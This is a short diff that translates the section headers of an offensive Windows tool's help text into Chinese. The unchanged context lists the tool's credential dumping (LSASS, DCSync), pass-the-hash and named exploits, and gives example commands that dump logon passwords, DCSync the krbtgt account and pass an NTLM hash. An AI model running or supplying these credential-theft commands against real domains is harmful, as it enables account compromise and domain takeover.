@@ -1,8 +1,8 @@
-ABOUT
+关于
     Dumps credentials from LSASS providers, performs DCSync, pass the hash,
     Zerologon, PrintNightmare, and HiveNightmare.
 
-USAGE:
+用法：
     net-sharp-katz --- --Command <command> [options]
 
 CREDENTIAL DUMPING:
@@ -47,7 +47,7 @@ EXPLOITS:
       --Library       UNC path to DLL
     hiveghtmare       CVE-2021-36934 (HiveNightmare)
 
-EXAMPLES:
+示例：
     net-sharp-katz --- --Command logonpasswords
     net-sharp-katz --- --Command dcsync --User krbtgt --Domain corp.local --DomainController dc01.corp.local
     net-sharp-katz --- --Command pth --User admin --Domain corp --NtlmHash HASH
